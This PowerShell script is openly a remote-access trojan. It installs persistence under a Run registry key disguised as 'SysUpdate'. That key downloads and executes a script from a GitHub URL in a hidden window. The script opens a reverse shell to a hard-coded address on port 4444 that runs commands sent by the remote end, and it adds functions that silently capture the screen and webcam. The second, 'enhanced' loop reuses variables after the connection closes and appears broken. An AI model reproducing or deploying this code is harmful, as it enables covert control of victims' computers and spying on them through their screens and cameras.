# Persistence via HKCU\Run (self-download from GitHub)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "SysUpdate"
$githubUrl = "https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v2.ps1"
if (-not (Get-ItemProperty $regPath -Name $regName -ErrorAction SilentlyContinue)) {
    Set-ItemProperty $regPath $regName "powershell -w hidden -nop -c IEX((New-Object Net.WebClient).DownloadString('$githubUrl'))"
}

# Load required assemblies for screenshot/webcam
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName Windows.Media.Capture,Windows.Media.Ocx,Windows.Media.Devices @"
using Windows.Media.Capture;
using Windows.Media.MediaProperties;
"@

# Screenshot function (reliable)
function Get-Screenshot {
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
    $graphics.Dispose()
    $ms = New-Object IO.MemoryStream
    $bitmap.Save($ms, [Drawing.Imaging.ImageFormat]::Jpeg)
    $bytes = $ms.ToArray()
    $ms.Close()
    $bitmap.Dispose()
    return [Convert]::ToBase64String($bytes)
}

# Webcam capture function (WinRT MediaCapture - works on Win10+)
function Get-WebcamFrame {
    try {
        $mediaCapture = New-Object Windows.Media.Capture.MediaCapture
        $mediaCapture.Initialize()
        $photoStorageFile = [Windows.Storage.ApplicationData]::Current.LocalFolder.CreateFileAsync("temp.jpg", [Windows.Storage.CreationCollisionOption]::ReplaceExisting) | % Await
        $mediaCapture.CapturePhotoToStorageFileAsync([Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg(), $photoStorageFile) | % Await
        $fileStream = $photoStorageFile.OpenReadAsync() | % Await
        $bytes = New-Object byte[] $fileStream.Size
        $fileStream.ReadAsync($bytes, 0, $bytes.Length) | % Await
        $fileStream.Dispose()
        $photoStorageFile.DeleteAsync() | % Await
        $mediaCapture.Dispose()
        return [Convert]::ToBase64String($bytes)
    } catch {
        return "Webcam failed: $_"
    }
}

# YOUR EXACT OG PICO SHELL LOOP (UNCHANGED)
$client = New-Object System.Net.Sockets.TCPClient('192.168.1.15',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# Enhanced shell with screenshot/webcam commands
while($true) {
    $cmd = (iex $data 2>&1 | Out-String)
    switch -regex ($cmd.Trim()) {
        '^screenshot$' { $cmd = "Screenshot:`n" + (Get-Screenshot | Out-String) }
        '^webcam$' { $cmd = "Webcam:`n" + (Get-WebcamFrame | Out-String) }
        default { $cmd }
    }
    $sendback2 = $cmd + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
